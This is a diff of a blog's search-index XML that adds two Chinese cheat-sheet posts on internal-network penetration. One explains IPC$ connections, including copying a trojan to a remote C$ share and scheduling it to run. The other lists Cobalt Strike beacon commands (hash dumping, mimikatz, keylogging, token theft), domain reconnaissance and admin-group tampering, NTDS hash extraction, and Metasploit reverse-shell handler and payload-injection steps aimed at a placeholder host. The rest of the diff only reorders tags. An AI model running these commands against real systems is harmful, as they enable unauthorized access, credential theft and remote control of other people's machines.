@@ -4,6 +4,52 @@
   
   
   <entry>
+    <title>IPC连接常用命令</title>
+    <link href="/IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <url>/IPC%E8%BF%9E%E6%8E%A5%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    
+    <content type="html"><![CDATA[<p>IPC连接的一些整理</p><a id="more"></a><h1 id="IPC连接常用命令"><a href="#IPC连接常用命令" class="headerlink" title="IPC连接常用命令"></a>IPC连接常用命令</h1><h2 id="00-概念"><a href="#00-概念" class="headerlink" title="00 概念"></a>00 概念</h2><p>IPC是英文Internet Process Connection的缩写，可以理解为“命名管道”资源，它是Windows操作系统提供的一个通信基础，用来在两台计算机进程之间建立通信连接，而IPC后面的“$”是Windows系统所使用的隐藏符号，因此“IPC$”表示IPC共享，但是是隐藏的共享</p><p>IPC$是Windows NT及Windows 2000/XP/2003特有的一项功能，通过这项功能，一些网络程序的数据交换可以建立在IPC上面，实现远程访问和管理计算机</p><p>为了配合IPC共享工作，Windows操作系统（不包括Windows 98系列）在安装完成后，自动设置共享的目录为：C盘、D盘、E盘、ADMIN目录（C:\WINNT\）等，即为ADMIN$、C$、D$、E$等等，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。在MS-DOS中键入“net share”命令来查看本机共享资源</p><h2 id="02-利用条件"><a href="#02-利用条件" class="headerlink" title="02 利用条件"></a>02 利用条件</h2><ol><li>开启了139，445端口</li><li>Windows NT及以上操作系统</li><li>得知目标的用户名和密码</li></ol><h2 id="03-操作命令"><a href="#03-操作命令" class="headerlink" title="03 操作命令"></a>03 操作命令</h2><ol><li><p>建立空连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "" /user:""</code></pre></li><li><p>建立完整连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ "password" /user:"username"</code></pre></li><li><p>映射路径</p><pre><code class="hljs shell">net use z: \\127.0.0.1\c$ "密码" /user:"用户名"  (即可将对方的c盘映射为自己的z盘，其他盘类推)</code></pre></li><li><p>访问路径</p><pre><code class="hljs shell">net use z: \\127.0.0.1\c$   #直接访问</code></pre></li><li><p>删除路径</p><pre><code class="hljs shell">net use c: /del     删除映射的c盘，其他盘类推 net use * /del      删除全部,会有提示要求按y确认</code></pre></li><li><p>删除IPC$连接</p><pre><code class="hljs shell">net use \\127.0.0.1\ipc$ /del</code></pre></li><li><p>启动与关闭服务</p><pre><code class="hljs shell">net start //查看已经开启的服务net start servername //启动服务net stop servername//关闭服务</code></pre></li><li><p>启动与关闭共享</p><pre><code class="hljs shell">net shate ipc$ //开启ipc$默认共享net share ipc$ /del //关闭ipc$默认共享net share c=c:\ //完全共享c盘net share d=d:\ //删除完全共享的d盘</code></pre></li><li><p>复制远程文件</p><pre><code class="hljs shell">Copy e:\server.exe \\127.0.0.1\c$ \\将本地的E盘下的server.exe这个文件copy到对方系统的C盘根目录下</code></pre><p>Copy复制成功所需的条件：必须与主机建立ipc$连接</p></li><li><p>运行远程程序</p><pre><code class="hljs shell">At \\127.0.0.1 12:30 c:\server.exe \\让主机在中午12:30分运行我们已经复制到他C盘根目录下的木马server.exe</code></pre></li></ol><h2 id="04-错误代码"><a href="#04-错误代码" class="headerlink" title="04 错误代码"></a>04 错误代码</h2><ol><li>错误号5，拒绝访问 ： 很可能你使用的用户不是管理员权限的，先提升权限；</li><li>错误号51，Windows 无法找到网络路径 : 网络有问题； </li><li>错误号53，找不到网络路径 ： ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）</li><li>错误号67，找不到网络名 ： 你的lanmanworkstation服务未启动，目标删除了ipc$；</li><li>错误号1219，提供的凭据与已存在的凭据集冲突 ： 你已经和对方建立了一个ipc$，请删除再连</li><li>错误号1326，未知的用户名或错误密码 </li><li>错误号1792，试图登录，但是网络登录服务没有启动 ： 目标NetLogon服务未启动。（连接域控会出现此情况） </li><li>错误号2242，此用户的密码已经过期 ： 目标有帐号策略，强制定期要求更改密码。</li></ol>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>内网渗透</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>cobalt strike内网渗透常用命令</title>
+    <link href="/cobalt-strike%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
+    <url>/cobalt-strike%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    
+    <content type="html"><![CDATA[<p>域渗透、内网渗透的一些命令</p><a id="more"></a><h1 id="cobalt-strike内网渗透常用命令"><a href="#cobalt-strike内网渗透常用命令" class="headerlink" title="cobalt strike内网渗透常用命令"></a>cobalt strike内网渗透常用命令</h1><h2 id="00-菜单功能"><a href="#00-菜单功能" class="headerlink" title="00 菜单功能"></a>00 菜单功能</h2><ul><li><p>cobalt strike</p><ul><li>New Connection  新的链接</li><li>Preferences 偏好设置</li><li>Visualization  窗口视图模式</li><li>VPN interfaces  VPN接入</li><li>Listeners  监听器</li><li>Sript Manager  脚本管理</li><li>Close 退出</li></ul></li><li><p>View：</p><ul><li>Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</li><li>Credentials 显示所有已经获取的用户主机hash</li><li>Downloads 显示下载的文件</li><li>Event log 事件日志 记录团队  目标上线等记录</li><li>Keystrokes 目标键盘记录</li><li>Proxy Pivots 代理信息</li><li>Screenshots 屏幕截图</li><li>Script Console 加载自定义脚本</li><li>Targets 显示所有主机</li><li>Web log web服务日志</li></ul></li><li><p>Attack：</p><ul><li>Packages<ul><li>HTML Application 生成hta文件</li><li>MS Office Macro  宏office文件</li><li>Payload Generator  生成各种语言版本的payload</li><li>USB/CD AutoPlay 利用自动播放运行的被控端文件</li><li>Windows Dropper 捆绑器可将任意正常的文件</li><li>Windows Executable payload生成可执行文件 (一般使用这个)</li><li>Windows Executable (S)  把包含payload,Stageless生成可执行文件(包含多数功能)</li></ul></li><li>Web Drive-by：<ul><li>Manage  开启的所有web服务</li><li>Clone Site 克隆网站 </li><li>Host File 提供Web以供下载某文件</li><li>Scripted Web Delivery  为payload提供web服务以便于下载和执行</li><li>Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</li><li>Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</li><li>System Profiler 获取系统，Flash，浏览器版本等</li></ul></li></ul></li><li><p>spear phishing 鱼叉式网络钓鱼</p></li><li><p>Reporting：</p><ul><li>Activity report  活动报告</li><li>Hosts report  主机报告</li><li>Indicators of Compromise 威胁报告</li><li>Sessions report  会话报告</li><li>Social engineering report  社会工程学报告</li></ul></li></ul><h2 id="01-右键功能"><a href="#01-右键功能" class="headerlink" title="01 右键功能"></a>01 右键功能</h2><ul><li><p>Interact 打开beacon</p></li><li><p>Access </p><ul><li>dump hashes 获取hash</li><li>Elevate  提权</li><li>Golden Ticket 生成黄金票据注入当前会话</li><li>MAke token  凭证转换</li><li>Run Mimikatz 运行 Mimikatz </li><li>Spawn As 用其他用户生成Cobalt Strike侦听器</li></ul></li><li><p>Explore</p><ul><li>Browser Pivot 劫持目标浏览器进程</li><li>Desktop(VNC)  桌面交互</li><li>File Browser  文件浏览器</li><li>Net View 命令Net View</li><li>Port scan 端口扫描</li><li>Process list 进程列表</li><li>Screenshot 截图</li></ul></li><li><p>Pivoting</p><ul><li><p>SOCKS Server 代理服务</p></li><li><p>Listener  反向端口转发</p></li><li><p>Deploy VPN 部署VPN</p></li></ul></li><li><p>Spawn  新的通讯模式并生成会话</p></li><li><p>Session 会话管理，删除，心跳时间，退出，备注</p></li></ul><h2 id="02-beacon命令"><a href="#02-beacon命令" class="headerlink" title="02 beacon命令"></a>02 beacon命令</h2><ul><li><p>argue            进程参数欺骗</p></li><li><p>browserpivot        注入受害者浏览器进程</p></li><li><p>bypassuac         绕过UAC</p></li><li><p>cancel           取消正在进行的下载</p></li><li><p>cd             切换目录</p></li><li><p>checkin          强制让被控端回连一次</p></li><li><p>clear           清除beacon内部的任务队列</p></li><li><p>connect          Connect to a Beacon peerover TCP</p></li><li><p>covertvpn         部署Covert VPN客户端</p></li><li><p>cp             复制文件</p></li><li><p>dcsync           从DC中提取密码哈希</p></li><li><p>desktop          远程VNC</p></li><li><p>dllinject         反射DLL注入进程</p></li><li><p>dllload          使用LoadLibrary将DLL加载到进程中</p></li><li><p>download          下载文件</p></li><li><p>downloads         列出正在进行的文件下载</p></li><li><p>drives           列出目标盘符</p></li><li><p>elevate          尝试提权</p></li><li><p>execute          在目标上执行程序(无输出)</p></li><li><p>execute-assembly      在目标上内存中执行本地.NET程序</p></li><li><p>exit            退出beacon</p></li><li><p>getprivs          Enable system privileges oncurrent token</p></li><li><p>getsystem         尝试获取SYSTEM权限</p></li><li><p>getuid           获取用户ID</p></li><li><p>hashdump          转储密码哈希值</p></li><li><p>help            帮助</p></li><li><p>inject           在特定进程中生成会话</p></li><li><p>jobkill          杀死一个后台任务</p></li><li><p>jobs            列出后台任务</p></li><li><p>kerberos_ccache_use    从ccache文件中导入票据应用于此会话</p></li><li><p>kerberos_ticket_purge   清除当前会话的票据</p></li><li><p>kerberos_ticket_use    从ticket文件中导入票据应用于此会话</p></li><li><p>keylogger         键盘记录</p></li><li><p>kill            结束进程</p></li><li><p>link            Connect to a Beacon peerover a named pipe</p></li><li><p>logonpasswords       使用mimikatz转储凭据和哈希值</p></li><li><p>ls             列出文件</p></li><li><p>make_token         创建令牌以传递凭据</p></li><li><p>mimikatz          运行mimikatz</p></li><li><p>mkdir           创建一个目录</p></li><li><p>mode dns          使用DNS A作为通信通道(仅限DNS beacon)</p></li><li><p>mode dns-txt        使用DNS TXT作为通信通道(仅限D beacon)</p></li><li><p>mode dns6         使用DNS AAAA作为通信通道(仅限DNS beacon)</p></li><li><p>mode http         使用HTTP作为通信通道</p></li><li><p>mv             移动文件</p></li><li><p>net            net命令</p></li><li><p>note            备注    </p></li><li><p>portscan          进行端口扫描</p></li><li><p>powerpick         通过Unmanaged PowerShell执行命令</p></li><li><p>powershell         通过powershell.exe执行命令</p></li><li><p>powershell-import     导入powershell脚本</p></li><li><p>ppid            Set parent PID forspawned post-ex jobs</p></li><li><p>ps             显示进程列表</p></li><li><p>psexec           Use a service to spawn asession on a host</p></li><li><p>psexec_psh         Use PowerShell to spawn asession on a host</p></li><li><p>psinject          在特定进程中执行PowerShell命令</p></li><li><p>pth            使用Mimikatz进行传递哈希</p></li><li><p>pwd            当前目录位置</p></li><li><p>reg            Query the registry</p></li><li><p>rev2self          恢复原始令牌</p></li><li><p>rm             删除文件或文件夹</p></li><li><p>rportfwd          端口转发</p></li><li><p>run            在目标上执行程序(返回输出)</p></li><li><p>runas           以另一个用户权限执行程序</p></li><li><p>runasadmin         在高权限下执行程序</p></li><li><p>runu            Execute a program underanother PID</p></li><li><p>screenshot         屏幕截图</p></li><li><p>setenv           设置环境变量</p></li><li><p>shell           cmd执行命令</p></li><li><p>shinject          将shellcode注入进程</p></li><li><p>shspawn          生成进程并将shellcode注入其中</p></li><li><p>sleep           设置睡眠延迟时间</p></li><li><p>socks           启动SOCKS4代理</p></li><li><p>socks stop         停止SOCKS4</p></li><li><p>spawn           Spawn a session</p></li><li><p>spawnas          Spawn a session as anotheruser</p></li><li><p>spawnto          Set executable tospawn processes into</p></li><li><p>spawnu           Spawn a session underanother PID</p></li><li><p>ssh            使用ssh连接远程主机</p></li><li><p>ssh-key          使用密钥连接远程主机</p></li><li><p>steal_token        从进程中窃取令牌</p></li><li><p>timestomp         将一个文件时间戳应用到另一个文件</p></li><li><p>unlink           Disconnect from parentBeacon</p></li><li><p>upload           上传文件</p></li><li><p>wdigest          使用mimikatz转储明文凭据</p></li><li><p>winrm           使用WinRM在主机上生成会话</p></li><li><p>wmi            使用WMI在主机上生成会话</p></li></ul><h2 id="03-内网渗透常用命令"><a href="#03-内网渗透常用命令" class="headerlink" title="03 内网渗透常用命令"></a>03 内网渗透常用命令</h2><p><a href="https://www.t00ls.net/articles-39285.html" target="_blank" rel="noopener">参考</a></p><ul><li><p>ipconfig/all  //查看IP地址</p></li><li><p>ipconfig /release //释放地址</p></li><li><p>ipconfig /renew 重新获取Ip地址</p></li><li><p>whoami  //查询账号所属权限</p></li><li><p>whoami/all //查看sid值</p></li><li><p>systeminfo //查询系统以及补丁信息</p></li><li><p>tasklist /svc  //查看进程</p></li><li><p>taskkill /im 进程名称(cmd) //结束进程</p></li><li><p>taskkill /pid[进程码] -t(结束该进程) -f(强制结束该进程以及所有子进程)</p></li><li><p>wmic qfe get hotfixid  //查看已安装过得补丁，这个很实用</p></li><li><p>wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</p></li><li><p>wmic qfe    //查询补丁信息以及微软提供的下载地址</p></li><li><p>ping hostname(主机名）  //显示该机器名的IP</p></li><li><p>net start  //查看当前运行的服务</p></li><li><p>net user    //查看本地组的用户</p></li><li><p>net localgroup administrators  //查看本机管理员组有哪些用户</p></li><li><p>net use    //查看会话</p></li><li><p>net session   //查看当前会话</p></li><li><p>net share    //查看SMB指向的路径[即共享]</p></li><li><p>wmic share get name,path  //查看SMB指向的路径</p></li><li><p>wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</p></li><li><p>net use \IP\ipc$ password /user:username    //建立IPC会话（工作组模式）</p></li><li><p>net use z: \192.168.1.1    //建立映射到本机Z盘</p></li><li><p>net time \172.16.16.2     //查询共享主机的是</p></li><li><p>at \172.16.16.2 13:50 c:\windows\2009.exe    //在共享主机上执行</p></li><li><p>netstat -ano    //查看开放的端口</p></li><li><p>netstat -an | find “3389”  //找到3389端口</p></li><li><p>net accounts    //查看本地密码策略</p></li><li><p>nbtstat –A ip    //netbiso查询</p></li><li><p>net view    //查看机器注释或许能得到当前活动状态的机器列表，如果禁用netbios就查看不出来</p></li></ul><p>echo %PROCESSOR_ARCHITECTURE%     //查看系统是32还是64位 </p><ul><li><p>set                    //查看系统环境设置变量</p></li><li><p>net start              //查看当前运行的服务</p></li><li><p>wmic service list brief        //查看进程服务</p></li><li><p>wmic process list brief      //查看进程</p></li><li><p>wmic startup list brief    //查看启动程序信息</p></li><li><p>wmic product list brief       //查看安装程序和版本信息（漏洞利用线索）</p></li><li><p>wmic startup list full      //识别开机启动的程序</p></li><li><p>wmic process where(description=”mysqld.exe”) &gt;&gt;mysql.log //获取软件安装路径</p></li></ul><h2 id="04-域渗透常用命令"><a href="#04-域渗透常用命令" class="headerlink" title="04 域渗透常用命令"></a>04 域渗透常用命令</h2><ul><li><p>net group /domain               //获得所有域用户组列表</p></li><li><p>net group qq_group /domain         //显示域中qq_group组的成员</p></li><li><p>net group qq_group /del /domain      //删除域中qq_group组</p></li><li><p>net group qq_group qq /del /domain    //删除域内qq_group 群组中的成员QQ</p></li><li><p>net group qq_group /add /domain      //增加域中的群组</p></li><li><p>net group “domain admins” /domain    //获得域管理员列表</p></li><li><p>net group “enterprise admins” /domain  //获得企业管理员列表</p></li><li><p>net localgroup administrators /domain  //获取域内置administrators组用（enterprise admins、domain admins）</p></li><li><p>net group “domain controllers” /domain  //获得域控制器列表</p></li><li><p>net group “domain computers” /domain  //获得所有域成员计算机列表</p></li><li><p>net user /domain               //获得所有域用户列表</p></li><li><p>net user someuser /domain         //获得指定账户someuser的详细信息</p></li><li><p>net accounts /domain          //获得域密码策略设置，密码长短，错误锁定等信息</p></li><li><p>net view /domain            //查询有几个域, 查询域列表</p></li><li><p>net view /domain:testdomain    //查看 testdomain域中的计算机列表</p></li><li><p>nltest /domain_trusts        //获取域信任信息</p></li><li><p>net user domain-admin /domain   //查看管理员登陆时间，密码过期时间，是否有登陆脚本，组分配等信息</p></li><li><p>net config Workstation      //查询机器属于哪个域</p></li><li><p>net time /domian          //查询主域服务器的时间</p></li><li><p>echo %logonserver%         //查看登陆到这台服务器的计算机名</p></li><li><p>net time \192.168.1.1      //查询远程共享主机192.168.1.1的时间</p></li><li><p>net use \IP\ipc$ password /user:username@domain   //ipc$域内连接</p></li><li><p>net view \dc2.backlion.com      //查看域控共享情况</p></li><li><p>dir \dc2.backlion.com\SYSVOL /s /a &gt; sysvol.txt //列出sysvol日志记录</p></li><li><p>xcopy \dc2.backlion.com\sysvol.txt sysvol.txt /i /e /c//远程拷贝到本地sysvol日志</p></li><li><p>net user /domain bk bk123           //修改域内用户密码，需要管理员权限</p></li><li><p>net localgroup administartors  SEZKL\backlion /add   //将SEZKL域中的用户backlion添加到administrators组中</p></li><li><p>mstsc /admin           //远程桌面登录到console会话解决hash无法抓出问题</p></li><li><p>gpupdate/force            //更新域策略</p></li><li><p>psexec \192.168.1.3 -u administrator -p bk1234 -c gsecdump.exe -u</p><p>//从域服务器密码存储文件windows/ntds/ntds.dit导出hash值出来</p></li><li><p>gsecdump -a     //获取域登管理员登录过得hash值，这里gescdump为第三方导出AD域的hash值</p></li><li><p>tasklist /S ip /U domain\username /P /V  //查看远程计算机进程列</p></li></ul><h2 id="05-dsquery的AD查询工具"><a href="#05-dsquery的AD查询工具" class="headerlink" title="05 dsquery的AD查询工具"></a>05 dsquery的AD查询工具</h2><ul><li><p>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain  //列出该域内所有用户名</p></li><li><p>dsquery server -domain super.com | dsget server -dnsname -site  //搜索域内所有域控制器并显示他们的DNS主机名和站点名称</p></li><li><p>dsquery contact  //寻找目录中的联系人</p></li><li><p>dsquery subnet   //列出该域内网段划分</p></li><li><p>query user        //查询那些用户在线</p></li><li><p>dsquery group &amp;&amp; net group /domain   //列出该域内分组</p></li><li><p>dsquery ou                   //列出该域内组织单位</p></li><li><p>dsquery server &amp;&amp; net time /domain    //列出该域内域控制器</p></li><li><p>dsquery site -o rdn           //搜索域中所有站点的名称</p></li><li><p>dsquery group dc=super,dc=com |more  //搜索在DC=SUPER,DC=COM 域中的所有组</p></li><li><p>psloggedon.exe                //查询那台主机和用户登录到该主机上</p></li><li><p>netsess.exe  //192.168.1.115      //远程主机上无需管理员权限,查询到主机名和用户</p></li><li><p>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT” //获取最近mstsc登录的记录</p></li></ul><h2 id="06-CS与MSF互转"><a href="#06-CS与MSF互转" class="headerlink" title="06 CS与MSF互转"></a>06 CS与MSF互转</h2><ul><li><p>CS到MSF</p><ul><li><p>在CS中获取一个beacon</p></li><li><p>在msf中设置监听</p><pre><code class="hljs gams">use exploit/multi/handler<span class="hljs-keyword">set</span> padyload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost xx.xx.xx.xx</span><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 1234</span>run</code></pre></li><li><p>在CS中设置一个监听器</p><p>windows/foreign/reverse_tcp Listener</p><p>其中ip为msf的ip地址，端口为msf所监听的端口</p></li><li><p>右键spawn，选择刚才设置的监听器即可</p></li></ul></li><li><p>MSF到CS</p><ul><li><p>在MSF中获取一个Meterpreter</p></li><li><p>在CS中设置一个监听</p></li><li><p>在MSF中进行注入，注意payload要与CS监听使用的payload一致</p><pre><code class="hljs routeros">msf exploit(handler) &gt;  use exploit/windows/local/payload_inject msf exploit(payload_inject) &gt;  <span class="hljs-builtin-name">set</span> PAYLOAD windows/meterpreter/reverse_http msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> DisablePayloadHandler <span class="hljs-literal">true</span> msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LHOST xx.xx.xx.xx msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> LPORT 1234msf exploit(payload_inject) &gt; <span class="hljs-builtin-name">set</span> SESSION 1 msf exploit(payload_inject) &gt; exploit</code></pre></li><li><p>主机上线</p></li></ul></li></ul><h2 id="07-键盘快捷键"><a href="#07-键盘快捷键" class="headerlink" title="07 键盘快捷键"></a>07 键盘快捷键</h2><p>摘自<a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf" target="_blank" rel="noopener">官方文档</a></p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>工具使用</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>内网渗透</tag>
+      
+      <tag>工具使用</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>使用jenv管理JDK版本</title>
     <link href="/%E4%BD%BF%E7%94%A8jenv%E7%AE%A1%E7%90%86JDK%E7%89%88%E6%9C%AC/"/>
     <url>/%E4%BD%BF%E7%94%A8jenv%E7%AE%A1%E7%90%86JDK%E7%89%88%E6%9C%AC/</url>
@@ -97,9 +143,9 @@
     
     <tags>
       
-      <tag>权限提升</tag>
-      
       <tag>Windows</tag>
+      
+      <tag>权限提升</tag>
       
       <tag>工具使用</tag>
       
@@ -126,9 +172,9 @@
     
     <tags>
       
-      <tag>权限提升</tag>
-      
       <tag>Windows</tag>
+      
+      <tag>权限提升</tag>
       
       <tag>工具使用</tag>
       
@@ -155,9 +201,9 @@
     
     <tags>
       
-      <tag>权限提升</tag>
-      
       <tag>Windows</tag>
+      
+      <tag>权限提升</tag>
       
       <tag>工具使用</tag>
       
@@ -346,9 +392,9 @@
     
     <tags>
       
-      <tag>权限提升</tag>
-      
       <tag>Windows</tag>
+      
+      <tag>权限提升</tag>
       
       <tag>工具使用</tag>
       
@@ -1230,9 +1276,9 @@
     
     <tags>
       
-      <tag>工具使用</tag>
-      
       <tag>密码学</tag>
+      
+      <tag>工具使用</tag>
       
       <tag>python</tag>
       
